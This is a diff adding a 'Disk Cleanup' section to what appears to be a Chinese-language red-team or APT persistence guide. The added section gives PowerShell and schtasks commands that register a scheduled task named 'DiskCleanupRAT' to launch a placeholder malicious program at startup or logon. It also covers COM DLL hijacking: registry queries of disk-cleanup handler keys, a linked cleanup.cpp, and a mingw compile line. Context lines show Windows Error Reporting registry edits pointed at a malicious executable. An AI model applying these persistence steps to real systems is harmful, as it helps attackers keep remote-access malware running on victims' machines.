@@ -1218,3 +1218,38 @@ Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\Windows Error Reporting
 Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\Windows Error Reporting\LocalDumps" -Name "DumpFolder" -Value "C:\Path\To\Dump"
 Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\Windows Error Reporting\LocalDumps" -Name "DumpPath" -Value 恶意可执行程序路径
 ```
+
+### 磁盘清理
+
+1、创建计划任务
+
+```powershell
+# 定义恶意程序路径
+$maliciousPath = "恶意程序路径"
+
+# 创建计划任务以在磁盘清理时执行恶意程序
+$action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c start /min $maliciousPath"
+$trigger = New-ScheduledTaskTrigger -AtStartup
+$task = New-ScheduledTask -Action $action -Trigger $trigger -Description "Run RAT on Disk Cleanup"
+Register-ScheduledTask -TaskName "DiskCleanupRAT" -InputObject $task
+```
+
+```powershell
+schtasks /create /tn "DiskCleanupRAT" /tr "cmd.exe /c start /min 恶意程序路径" /sc onlogon
+```
+
+2、COM DLL劫持
+
+```powershell
+reg query "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Explorer\VolumeCaches" /s
+```
+
+[cleanup.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/Per/cleanup.cpp)
+
+```Bash
+x86_64-w64-mingw32-g++ -O2 cleanup.cpp -o cleanup.exe -I /usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
+```
+
+```powershell
+reg query "HKEY_CURRENT_USER\Software\Classes\CLSID\{8369AB20-56C9-11D0-94E8 -00AA0059CE02}" /s
+```
